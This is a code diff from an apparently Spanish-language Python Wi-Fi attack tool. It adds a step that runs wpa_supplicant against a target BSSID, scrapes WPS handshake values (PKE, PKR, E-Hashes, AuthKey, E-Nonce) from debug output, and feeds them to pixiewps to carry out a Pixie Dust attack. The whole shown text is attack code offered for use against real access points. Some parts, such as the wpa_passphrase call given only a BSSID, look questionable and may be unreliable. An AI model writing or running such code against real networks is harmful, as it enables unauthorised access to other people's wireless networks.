@@ -52,19 +52,37 @@ def scan_wifi(interface):
                 continue
     return redes, bssids, canales
 
+def capture_wps_data(interface, bssid):
+    """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
+    print(f"Capturando datos WPS de la red con BSSID {bssid}...")
+    wpa_supplicant_command = f"wpa_supplicant -i {interface} -c <(wpa_passphrase {bssid}) -dd"
+    stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
+
+    pke = extract_value(stdout, "PKE:")
+    pkr = extract_value(stdout, "PKR:")
+    ehash1 = extract_value(stdout, "E-Hash1:")
+    ehash2 = extract_value(stdout, "E-Hash2:")
+    authkey = extract_value(stdout, "AuthKey:")
+    enonce = extract_value(stdout, "E-Nonce:")
+
+    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
+        print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
+        return None, None, None, None, None, None
+
+    return pke, pkr, ehash1, ehash2, authkey, enonce
+
 def perform_pixie_dust_attack(interface, bssid):
     """Realiza el ataque Pixie Dust usando pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    # Aquí deberías capturar los datos necesarios para pixiewps usando wpa_supplicant
-    # Este es un ejemplo simplificado, asegúrate de capturar los datos necesarios correctamente
-    pke = "PKE_example"
-    pkr = "PKR_example"
-    ehash1 = "E-Hash1_example"
-    ehash2 = "E-Hash2_example"
-    authkey = "AuthKey_example"
+
+    # Capturar los datos necesarios usando wpa_supplicant
+    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, bssid)
+    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
+        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
+        return
 
     # Ejecutar pixiewps con los valores capturados
-    pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
+    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
     print(f"Ejecutando pixiewps: {pixiewps_command}")
     pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
 
